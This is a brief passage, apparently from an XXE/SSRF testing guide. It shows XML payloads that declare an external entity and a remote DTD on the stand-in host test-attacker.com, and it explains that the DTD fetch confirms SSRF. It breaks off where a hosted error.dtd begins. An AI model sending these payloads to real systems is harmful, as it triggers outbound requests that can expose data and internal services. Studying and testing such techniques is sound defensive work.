...
# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://test-attacker.com/notify">]>
...
```xml
<!DOCTYPE foo PUBLIC "-//attacker//DTD//EN" "http://test-attacker.com/notify">
<root>normal content</root>
```

The XML parser fetches the DTD from `test-attacker.com` — confirms SSRF even without entity reflection.
...
```xml
<!-- Hosted at test-attacker.com/error.dtd: -->
